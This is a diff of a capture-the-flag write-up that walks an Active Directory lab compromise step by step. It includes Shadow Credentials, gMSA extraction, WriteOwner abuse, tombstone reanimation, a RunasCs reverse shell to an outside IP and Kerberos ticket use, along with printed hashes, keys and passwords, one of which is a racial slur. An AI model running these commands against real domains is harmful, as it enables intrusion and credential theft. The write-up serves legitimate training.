-</span></span></code></pre></div><p>It sets <code>logonHours</code> to 21 bytes of <code>0x00</code> (deny login at all times) and then disables the account. It was triggering automatically on <code>a.gunta</code>. Even after the UAC fix, I also had to repair <code>logonHours</code> via ldapmodify:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapmodify -x <span class=se>\
-</span></span></span><span class=line><span class=cl>  -H ldap://<span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -D <span class=s2>&#34;</span><span class=nv>$B_DJAWAD</span><span class=s2>@</span><span class=nv>$DOMAIN</span><span class=s2>&#34;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -w <span class=s2>&#34;</span><span class=nv>$B_DJAWAD_PASS</span><span class=s2>&#34;</span> <span class=s>&lt;&lt; EOF
-</span></span></span><span class=line><span class=cl><span class=s>dn: CN=a.gunta,OU=Users,OU=Shell Learning,DC=ad,DC=shell,DC=local
-</span></span></span><span class=line><span class=cl><span class=s>changetype: modify
-</span></span></span><span class=line><span class=cl><span class=s>replace: logonHours
-</span></span></span><span class=line><span class=cl><span class=s>logonHours:: ////////////////////////////
-</span></span></span><span class=line><span class=cl><span class=s>-
-</span></span></span><span class=line><span class=cl><span class=s>replace: userAccountControl
-</span></span></span><span class=line><span class=cl><span class=s>userAccountControl: 512
-</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
-</span></span></code></pre></div><p><strong>Shadow Credentials.</strong> With the account repaired, Shadow Credentials work by writing a certificate to the target&rsquo;s <code>msDS-KeyCredentialLink</code> attribute. PKINIT then lets you authenticate as that user without touching their password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python pywhisker/pywhisker.py <span class=se>\
-</span></span></span><span class=line><span class=cl>  -d <span class=nv>$DOMAIN</span> -u <span class=nv>$B_DJAWAD</span> -p <span class=nv>$B_DJAWAD_PASS</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  --dc-ip <span class=nv>$DCIP</span> --target a.gunta <span class=se>\
-</span></span></span><span class=line><span class=cl>  --action add --filename a.gunta_shadow
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>gettgtpkinit.py <span class=nv>$DOMAIN</span>/a.gunta <span class=se>\
-</span></span></span><span class=line><span class=cl>  -cert-pfx a.gunta_shadow.pfx <span class=se>\
-</span></span></span><span class=line><span class=cl>  -pfx-pass <span class=k>$(</span>cat a.gunta_shadow.pass<span class=k>)</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  a.gunta.ccache -dc-ip <span class=nv>$DCIP</span>
-</span></span></code></pre></div><p><img src=/images/writeups/hackini-shell-dc/bypass_restriction_script.png alt="certipy shadow auto showing certificate injected into msDS-KeyCredentialLink and PKINIT TGT obtained for a.gunta"></p><p>UnPAC-the-hash to get the NT hash:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>a.gunta.ccache
-</span></span><span class=line><span class=cl>getnthash.py <span class=nv>$DOMAIN</span>/a.gunta -key &lt;session-key&gt;
-</span></span><span class=line><span class=cl><span class=c1># a.gunta → NTLM: 59cddaf5635ed102995deb3f4f223b90</span>
-</span></span></code></pre></div><h2 id=gmsa-extraction>gMSA Extraction</h2><p><img src=/images/writeups/hackini-shell-dc/gunta_to_gmsa.png alt="BloodHound showing a.gunta has ReadGMSAPassword on gmsa$"></p><p><code>a.gunta</code> had <code>ReadGMSAPassword</code> on <code>gmsa$</code>, a delegated permission that lets specific accounts retrieve the current gMSA password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap 10.186.15.196 -u <span class=s1>&#39;a.gunta&#39;</span> -H <span class=s1>&#39;59cddaf5635ed102995deb3f4f223b90&#39;</span> --gmsa
-</span></span></code></pre></div><pre tabindex=0><code>gmsa$  NTLM:   424a1a9a08aabceda391a9fc4fd356b6
+</code></pre><p><code>b.djawad</code>&rsquo;s credentials surfaced from the <code>IT_Ops$</code> share, a script with hardcoded credentials. With those in hand, I used the AddMember right to add <code>b.djawad</code> to Contract Content Reviewers:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapmodify -x <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H ldap://<span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -D <span class="s2">&#34;</span><span class="nv">$B_DJAWAD</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -w <span class="s2">&#34;</span><span class="nv">$B_DJAWAD_PASS</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -f add_djawad_to_reviewers.ldif
+</span></span></code></pre></div><p><img src="/images/writeups/hackini-shell-dc/chain_execution.png" alt="ldapmodify adding b.djawad to Contract Content Reviewers, ldapsearch confirming group membership"></p>
+<p>That group had <strong>GenericWrite</strong> on <code>a.gunta</code>, which means write access to most of the user&rsquo;s AD attributes: targeted Kerberoasting, logon script hijacking, Shadow Credentials. I went with Shadow Credentials.</p>
+<p><strong>First problem: <code>a.gunta</code> was disabled.</strong> The account existed, BloodHound showed the GenericWrite edge clearly, but <code>ACCOUNTDISABLE</code> was set in <code>userAccountControl</code>. Any TGT request came back with <code>KDC_ERR_CLIENT_REVOKED</code>. We spent a while confused here since the Shadow Credentials steps ran without errors but PKINIT kept failing. The account is disabled, so the KDC won&rsquo;t issue a ticket regardless of how valid the certificate is.</p>
+<p>The fix, since GenericWrite covers <code>userAccountControl</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$B_DJAWAD</span> -p <span class="nv">$B_DJAWAD_PASS</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --dc-ip <span class="nv">$DCIP</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> object <span class="nv">$A_GUNTA</span> userAccountControl -v <span class="m">512</span>
+</span></span></code></pre></div><p><code>512</code> is <code>NORMAL_ACCOUNT</code>, a standard enabled user.</p>
+<p><img src="/images/writeups/hackini-shell-dc/enable_gunta.png" alt="ldapsearch confirming a.gunta userAccountControl: 512, account successfully re-enabled"></p>
+<p><strong>Second problem: the defensive script.</strong> The <code>IT_Ops$</code> share also had <code>Disable-DepartedUser.ps1</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$denyAllLogonHours</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="mf">21</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ADUser</span> <span class="n">-Identity</span> <span class="nv">$SamAccountName</span> <span class="o">-Replace</span> <span class="vm">@</span><span class="p">{</span> <span class="n">logonHours</span> <span class="p">=</span> <span class="nv">$denyAllLogonHours</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Disable-ADAccount</span> <span class="n">-Identity</span> <span class="nv">$SamAccountName</span>
+</span></span></code></pre></div><p>It sets <code>logonHours</code> to 21 bytes of <code>0x00</code> (deny login at all times) and then disables the account. It was triggering automatically on <code>a.gunta</code>. Even after the UAC fix, I also had to repair <code>logonHours</code> via ldapmodify:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapmodify -x <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H ldap://<span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -D <span class="s2">&#34;</span><span class="nv">$B_DJAWAD</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -w <span class="s2">&#34;</span><span class="nv">$B_DJAWAD_PASS</span><span class="s2">&#34;</span> <span class="s">&lt;&lt; EOF
+</span></span></span><span class="line"><span class="cl"><span class="s">dn: CN=a.gunta,OU=Users,OU=Shell Learning,DC=ad,DC=shell,DC=local
+</span></span></span><span class="line"><span class="cl"><span class="s">changetype: modify
+</span></span></span><span class="line"><span class="cl"><span class="s">replace: logonHours
+</span></span></span><span class="line"><span class="cl"><span class="s">logonHours:: ////////////////////////////
+</span></span></span><span class="line"><span class="cl"><span class="s">-
+</span></span></span><span class="line"><span class="cl"><span class="s">replace: userAccountControl
+</span></span></span><span class="line"><span class="cl"><span class="s">userAccountControl: 512
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span></code></pre></div><p><strong>Shadow Credentials.</strong> With the account repaired, Shadow Credentials work by writing a certificate to the target&rsquo;s <code>msDS-KeyCredentialLink</code> attribute. PKINIT then lets you authenticate as that user without touching their password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python pywhisker/pywhisker.py <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="nv">$DOMAIN</span> -u <span class="nv">$B_DJAWAD</span> -p <span class="nv">$B_DJAWAD_PASS</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --dc-ip <span class="nv">$DCIP</span> --target a.gunta <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --action add --filename a.gunta_shadow
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gettgtpkinit.py <span class="nv">$DOMAIN</span>/a.gunta <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -cert-pfx a.gunta_shadow.pfx <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -pfx-pass <span class="k">$(</span>cat a.gunta_shadow.pass<span class="k">)</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  a.gunta.ccache -dc-ip <span class="nv">$DCIP</span>
+</span></span></code></pre></div><p><img src="/images/writeups/hackini-shell-dc/bypass_restriction_script.png" alt="certipy shadow auto showing certificate injected into msDS-KeyCredentialLink and PKINIT TGT obtained for a.gunta"></p>
+<p>UnPAC-the-hash to get the NT hash:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>a.gunta.ccache
+</span></span><span class="line"><span class="cl">getnthash.py <span class="nv">$DOMAIN</span>/a.gunta -key &lt;session-key&gt;
+</span></span><span class="line"><span class="cl"><span class="c1"># a.gunta → NTLM: 59cddaf5635ed102995deb3f4f223b90</span>
+</span></span></code></pre></div><h2 id="gmsa-extraction">gMSA Extraction</h2>
+<p><img src="/images/writeups/hackini-shell-dc/gunta_to_gmsa.png" alt="BloodHound showing a.gunta has ReadGMSAPassword on gmsa$"></p>
+<p><code>a.gunta</code> had <code>ReadGMSAPassword</code> on <code>gmsa$</code>, a delegated permission that lets specific accounts retrieve the current gMSA password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap 10.186.15.196 -u <span class="s1">&#39;a.gunta&#39;</span> -H <span class="s1">&#39;59cddaf5635ed102995deb3f4f223b90&#39;</span> --gmsa
+</span></span></code></pre></div><pre tabindex="0"><code>gmsa$  NTLM:   424a1a9a08aabceda391a9fc4fd356b6
        AES256: 0bf76b1c5addbee035f72122d1b4bfec2fb5d8b6e085aef2a5bdaabd997be41
-</code></pre><p><img src=/images/writeups/hackini-shell-dc/gmsa_hash_aes_keys.png alt="nxc ldap –gmsa output showing NTLM and AES256 keys for gmsa$"></p><p>Two things blocked us immediately.</p><p><strong>Protected Users.</strong> <code>gmsa$</code> was in the Protected Users group: NTLM disabled, RC4 Kerberos disabled, no credential caching, no delegation. Pass-the-Hash doesn&rsquo;t work.</p><p><strong>Domain-wide AES enforcement.</strong> Initial attempts kept failing with <code>KDC_ERR_ETYPE_NOSUPP</code>. The domain had <code>msDS-SupportedEncryptionTypes</code> set to reject RC4 entirely. Some tools were silently falling back to RC4 even when we thought we were specifying AES. The fix was to be explicit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>getTGT.py <span class=nv>$DOMAIN</span>/<span class=s1>&#39;gmsa$&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -aesKey 0bf76b1c5addbee035f72122d1b4bfec2fb5d8b6e085aef2a5bdaabd997be41 <span class=se>\
-</span></span></span><span class=line><span class=cl>  -dc-ip <span class=nv>$DCIP</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>gmsa<span class=se>\$</span>.ccache
-</span></span></code></pre></div><p><img src=/images/writeups/hackini-shell-dc/TGT_gmsa_worked.png alt="getTGT.py with explicit -aesKey for gmsa$, Evil-WinRM session established as gmsa$"></p><h2 id=writeowner-and-tombstone-reanimation>WriteOwner and Tombstone Reanimation</h2><p><strong>WriteOwner.</strong> BloodHound&rsquo;s outbound edges from <code>gmsa$</code> showed it was a member of <code>LMS Integration Team</code>. That group had <strong>WriteOwner</strong> on <code>Core Platform Operations</code>.</p><p><img src=/images/writeups/hackini-shell-dc/gmsa_chain_to_core_operators.png alt="BloodHound showing gmsa$ via LMS Integration Team has WriteOwner on Core Platform Operations"></p><p>WriteOwner lets you take ownership of the object, then grant yourself any permissions, effectively escalating to GenericAll:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Take ownership</span>
-</span></span><span class=line><span class=cl>bloodyAD --dc-ip 10.186.15.196 -d ad.shell.local -u b.anes -p <span class=s1>&#39;bismallah&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=nb>set</span> owner <span class=s2>&#34;Core Platform Operations&#34;</span> b.anes
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># Grant GenericAll</span>
-</span></span><span class=line><span class=cl>bloodyAD --dc-ip 10.186.15.196 -d ad.shell.local -u b.anes -p <span class=s1>&#39;bismallah&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  add genericAll <span class=s2>&#34;Core Platform Operations&#34;</span> b.anes
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=c1># Add b.anes to the group</span>
-</span></span><span class=line><span class=cl>bloodyAD --dc-ip 10.186.15.196 -d ad.shell.local -u b.anes -p <span class=s1>&#39;bismallah&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  add groupMember <span class=s2>&#34;Core Platform Operations&#34;</span> b.anes
-</span></span></code></pre></div><p><code>TIP:</code> WriteOwner is underutilized in writeups. People know GenericWrite and GenericAll. WriteOwner is less discussed but equally powerful: take ownership, grant yourself full control, done.</p><p><strong>Reanimate-Tombstones.</strong> <code>Core Platform Operations</code> had the <code>Reanimate-Tombstones</code> extended right on the domain root, but it was not visible in BloodHound at all. Found it by running PowerView from inside the Evil-WinRM session:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Find-InterestingDomainAcl</span> <span class=n>-ResolveGUIDs</span>
-</span></span></code></pre></div><p><img src=/images/writeups/hackini-shell-dc/find_interesting_acls_reanimate_tombstone.png alt="Find-InterestingDomainAcl output showing Reanimate-Tombstones ExtendedRight on DC=ad,DC=shell,DC=local granted to Core Platform Operations"></p><pre tabindex=0><code>ObjectDN              : DC=ad,DC=shell,DC=local
+</code></pre><p><img src="/images/writeups/hackini-shell-dc/gmsa_hash_aes_keys.png" alt="nxc ldap –gmsa output showing NTLM and AES256 keys for gmsa$"></p>
+<p>Two things blocked us immediately.</p>
+<p><strong>Protected Users.</strong> <code>gmsa$</code> was in the Protected Users group: NTLM disabled, RC4 Kerberos disabled, no credential caching, no delegation. Pass-the-Hash doesn&rsquo;t work.</p>
+<p><strong>Domain-wide AES enforcement.</strong> Initial attempts kept failing with <code>KDC_ERR_ETYPE_NOSUPP</code>. The domain had <code>msDS-SupportedEncryptionTypes</code> set to reject RC4 entirely. Some tools were silently falling back to RC4 even when we thought we were specifying AES. The fix was to be explicit:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getTGT.py <span class="nv">$DOMAIN</span>/<span class="s1">&#39;gmsa$&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -aesKey 0bf76b1c5addbee035f72122d1b4bfec2fb5d8b6e085aef2a5bdaabd997be41 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -dc-ip <span class="nv">$DCIP</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>gmsa<span class="se">\$</span>.ccache
+</span></span></code></pre></div><p><img src="/images/writeups/hackini-shell-dc/TGT_gmsa_worked.png" alt="getTGT.py with explicit -aesKey for gmsa$, Evil-WinRM session established as gmsa$"></p>
+<h2 id="writeowner-and-tombstone-reanimation">WriteOwner and Tombstone Reanimation</h2>
+<p><strong>WriteOwner.</strong> BloodHound&rsquo;s outbound edges from <code>gmsa$</code> showed it was a member of <code>LMS Integration Team</code>. That group had <strong>WriteOwner</strong> on <code>Core Platform Operations</code>.</p>
+<p><img src="/images/writeups/hackini-shell-dc/gmsa_chain_to_core_operators.png" alt="BloodHound showing gmsa$ via LMS Integration Team has WriteOwner on Core Platform Operations"></p>
+<p>WriteOwner lets you take ownership of the object, then grant yourself any permissions, effectively escalating to GenericAll:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Take ownership</span>
+</span></span><span class="line"><span class="cl">bloodyAD --dc-ip 10.186.15.196 -d ad.shell.local -u b.anes -p <span class="s1">&#39;bismallah&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="nb">set</span> owner <span class="s2">&#34;Core Platform Operations&#34;</span> b.anes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Grant GenericAll</span>
+</span></span><span class="line"><span class="cl">bloodyAD --dc-ip 10.186.15.196 -d ad.shell.local -u b.anes -p <span class="s1">&#39;bismallah&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  add genericAll <span class="s2">&#34;Core Platform Operations&#34;</span> b.anes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Add b.anes to the group</span>
+</span></span><span class="line"><span class="cl">bloodyAD --dc-ip 10.186.15.196 -d ad.shell.local -u b.anes -p <span class="s1">&#39;bismallah&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  add groupMember <span class="s2">&#34;Core Platform Operations&#34;</span> b.anes
+</span></span></code></pre></div><p><code>TIP:</code> WriteOwner is underutilized in writeups. People know GenericWrite and GenericAll. WriteOwner is less discussed but equally powerful: take ownership, grant yourself full control, done.</p>
+<p><strong>Reanimate-Tombstones.</strong> <code>Core Platform Operations</code> had the <code>Reanimate-Tombstones</code> extended right on the domain root, but it was not visible in BloodHound at all. Found it by running PowerView from inside the Evil-WinRM session:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Find-InterestingDomainAcl</span> <span class="n">-ResolveGUIDs</span>
+</span></span></code></pre></div><p><img src="/images/writeups/hackini-shell-dc/find_interesting_acls_reanimate_tombstone.png" alt="Find-InterestingDomainAcl output showing Reanimate-Tombstones ExtendedRight on DC=ad,DC=shell,DC=local granted to Core Platform Operations"></p>
+<pre tabindex="0"><code>ObjectDN              : DC=ad,DC=shell,DC=local
 ActiveDirectoryRights : ExtendedRight
 ObjectAceType         : Reanimate-Tombstones
 IdentityReferenceName : Core Platform Operations
-</code></pre><p>BloodHound is your map, but it&rsquo;s not complete. Non-standard extended rights on the domain object itself don&rsquo;t show up. When you hit a dead end in BloodHound, reach for <code>Find-InterestingDomainAcl</code>.</p><p><strong>Tombstone enumeration.</strong> With <code>Reanimate-Tombstones</code>, we can query <code>CN=Deleted Objects</code> and restore soft-deleted AD objects. Tombstones retain their original SID and group memberships for up to the tombstone lifetime (default 180 days). If a privileged account was deleted, its tombstone can be restored and the original access recovered.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ldapsearch -x <span class=se>\
-</span></span></span><span class=line><span class=cl>  -H ldap://<span class=nv>$DC</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -Y GSSAPI <span class=se>\
-</span></span></span><span class=line><span class=cl>  -b <span class=s2>&#34;CN=Deleted Objects,DC=ad,DC=shell,DC=local&#34;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  -s subtree -a always <span class=se>\
-</span></span></span><span class=line><span class=cl>  -E <span class=s1>&#39;!1.2.840.113556.1.4.417&#39;</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  <span class=s2>&#34;(objectClass=user)&#34;</span> <span class=s2>&#34;*&#34;</span>
-</span></span></code></pre></div><p><img src=/images/writeups/hackini-shell-dc/raouf_revealed.png alt="ldapsearch Deleted Objects showing h.raouf.test tombstone with password Archive!Rao2026 in the description field"></p><p>Deleted user <strong><code>h.raouf.test</code></strong>, with this in its <code>description</code> attribute:</p><pre tabindex=0><code>description: &#34;Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin.&#34;
-</code></pre><p>Password sitting in the description of a tombstone. A test account gets deleted, the object and all its attributes live on in the Deleted Objects container, readable by anyone with the right to enumerate it.</p><p>Worth reading if you want to go deeper:</p><ul><li><a href=https://infosecwriteups.com/resurrecting-the-dead-exploiting-active-directorys-recycle-bin-%EF%B8%8F-%EF%B8%8F-5558982fc5fa>Resurrecting the Dead: Exploiting Active Directory&rsquo;s Recycle Bin</a></li><li><a href=https://cravaterouge.com/articles/ad-bin/>AD Recycle Bin — CravateRouge</a></li></ul><h2 id=domain-admin>Domain Admin</h2><p><strong><code>h.raouf</code> and <code>svc_shell</code>.</strong> <code>h.raouf</code> (reusing <code>Archive!Rao2026</code>) had access to the <code>IT_Ops$</code> share on the DC.</p><p><img src=/images/writeups/hackini-shell-dc/raouf_access_shares.png alt="nxc smb with h.raouf credentials showing share access confirmed and IT_Ops$ visible"></p><p>Inside that share, <code>RosterReplay.ps1</code> had <code>svc_shell</code>&rsquo;s credentials in plaintext:</p><p><img src=/images/writeups/hackini-shell-dc/shell_svc_password_in_private_share.jpg alt="RosterReplay.ps1 showing $ServicePassword = “Romio!Novemb2026” for SHELL\svc_shell"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$ServiceAccount</span> <span class=p>=</span> <span class=s2>&#34;SHELL\svc_shell&#34;</span>
-</span></span><span class=line><span class=cl><span class=nv>$ServicePassword</span> <span class=p>=</span> <span class=s2>&#34;Romio!Novemb2026&#34;</span>
-</span></span></code></pre></div><p>The machine reset every 20 minutes (shared environment). Rather than authenticating from outside, we used RunasCs from inside the existing <code>gmsa$</code> WinRM session:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.\</span><span class=n>RunasCs</span><span class=p>.</span><span class=py>exe</span> <span class=n>svc_shell</span> <span class=s2>&#34;Romio!Novemb2026&#34;</span> <span class=s2>&#34;powershell&#34;</span> <span class=p>`</span>
-</span></span><span class=line><span class=cl>  <span class=p>-</span><span class=n>-domain</span> <span class=n>ad</span><span class=p>.</span><span class=py>shell</span><span class=p>.</span><span class=py>local</span> <span class=p>`</span>
-</span></span><span class=line><span class=cl>  <span class=n>-r</span> <span class=mf>10.8</span><span class=p>.</span><span class=py>0</span><span class=p>.</span><span class=mf>58</span><span class=err>:</span><span class=mf>4444</span>
-</span></span></code></pre></div><p><img src=/images/writeups/hackini-shell-dc/runas_with_svc.png alt="RunasCs spawning a reverse shell as svc_shell from inside the gmsa$ WinRM session"></p><p><strong>pcap and <code>m.mahdi</code>.</strong> As <code>svc_shell</code>, we had access to <code>001_sample_traffic.pcapng</code>, a network capture from the LMS infrastructure containing NTLM authentication exchanges:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r 001_sample_traffic.pcapng -Y <span class=s2>&#34;ntlmssp&#34;</span> -T fields <span class=se>\
-</span></span></span><span class=line><span class=cl>  -e ntlmssp.auth.username <span class=se>\
-</span></span></span><span class=line><span class=cl>  -e ntlmssp.auth.domain <span class=se>\
-</span></span></span><span class=line><span class=cl>  -e ntlmssp.ntlmserverchallenge <span class=se>\
-</span></span></span><span class=line><span class=cl>  -e ntlmssp.auth.ntresponse <span class=se>\
-</span></span></span><span class=line><span class=cl>  2&gt;/dev/null <span class=p>|</span> grep -v <span class=s2>&#34;^</span>$<span class=s2>&#34;</span>
-</span></span></code></pre></div><p>NTLMv2 challenge/response for <code>m.mahdi</code>, a domain admin account. Cracked: <code>niggasaintshit</code>.</p><p><strong>Protected Users again.</strong> <code>m.mahdi</code> was also in Protected Users. NTLM blocked, PTH blocked. Same drill as before:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>getTGT.py ad.shell.local/m.mahdi:<span class=s1>&#39;niggasaintshit&#39;</span> -dc-ip 10.186.15.196
-</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>m.mahdi.ccache
-</span></span></code></pre></div><p><img src=/images/writeups/hackini-shell-dc/tgt_mahdi.jpg alt="getTGT.py showing Kerberos TGT obtained for m.mahdi saved to m.mahdi.ccache"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>evil-winrm -i SHELL-DC.ad.shell.local -r ad.shell.local
-</span></span></code></pre></div><p><img src=/images/writeups/hackini-shell-dc/winrm_with_mahdi.jpg alt="Evil-WinRM session as m.mahdi with Administrator desktop visible"></p><p>Use the hostname, not the IP. Kerberos ticket validation is tied to the SPN, which uses the hostname. Connecting by IP fails with a Kerberos error even with a valid ticket. Make sure <code>SHELL-DC.ad.shell.local</code> is in <code>/etc/hosts</code>:</p><p><img src=/images/writeups/hackini-shell-dc/hostnames.png alt="/etc/hosts showing 10.186.15.196 SHELL-DC.ad.shell.local entry highlighted"></p><p>Domain Admin shell as <code>m.mahdi</code>. Done.</p><h2 id=full-chain>Full Chain</h2><pre tabindex=0><code>h.dhayaa (initial creds)
+</code></pre><p>BloodHound is your map, but it&rsquo;s not complete. Non-standard extended rights on the domain object itself don&rsquo;t show up. When you hit a dead end in BloodHound, reach for <code>Find-InterestingDomainAcl</code>.</p>
+<p><strong>Tombstone enumeration.</strong> With <code>Reanimate-Tombstones</code>, we can query <code>CN=Deleted Objects</code> and restore soft-deleted AD objects. Tombstones retain their original SID and group memberships for up to the tombstone lifetime (default 180 days). If a privileged account was deleted, its tombstone can be restored and the original access recovered.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H ldap://<span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -Y GSSAPI <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -b <span class="s2">&#34;CN=Deleted Objects,DC=ad,DC=shell,DC=local&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -s subtree -a always <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -E <span class="s1">&#39;!1.2.840.113556.1.4.417&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s2">&#34;(objectClass=user)&#34;</span> <span class="s2">&#34;*&#34;</span>
+</span></span></code></pre></div><p><img src="/images/writeups/hackini-shell-dc/raouf_revealed.png" alt="ldapsearch Deleted Objects showing h.raouf.test tombstone with password Archive!Rao2026 in the description field"></p>
+<p>Deleted user <strong><code>h.raouf.test</code></strong>, with this in its <code>description</code> attribute:</p>
+<pre tabindex="0"><code>description: &#34;Hard Active Directory box. Kerberoasting, BloodHound ACL abuse, Shadow Credentials, gMSA password extraction, tombstone reanimation, and pcap NTLM cracking chain to Domain Admin.&#34;
+</code></pre><p>Password sitting in the description of a tombstone. A test account gets deleted, the object and all its attributes live on in the Deleted Objects container, readable by anyone with the right to enumerate it.</p>
+<p>Worth reading if you want to go deeper:</p>
+<ul>
+<li><a href="https://infosecwriteups.com/resurrecting-the-dead-exploiting-active-directorys-recycle-bin-%EF%B8%8F-%EF%B8%8F-5558982fc5fa">Resurrecting the Dead: Exploiting Active Directory&rsquo;s Recycle Bin</a></li>
+<li><a href="https://cravaterouge.com/articles/ad-bin/">AD Recycle Bin — CravateRouge</a></li>
+</ul>
+<h2 id="domain-admin">Domain Admin</h2>
+<p><strong><code>h.raouf</code> and <code>svc_shell</code>.</strong> <code>h.raouf</code> (reusing <code>Archive!Rao2026</code>) had access to the <code>IT_Ops$</code> share on the DC.</p>
+<p><img src="/images/writeups/hackini-shell-dc/raouf_access_shares.png" alt="nxc smb with h.raouf credentials showing share access confirmed and IT_Ops$ visible"></p>
+<p>Inside that share, <code>RosterReplay.ps1</code> had <code>svc_shell</code>&rsquo;s credentials in plaintext:</p>
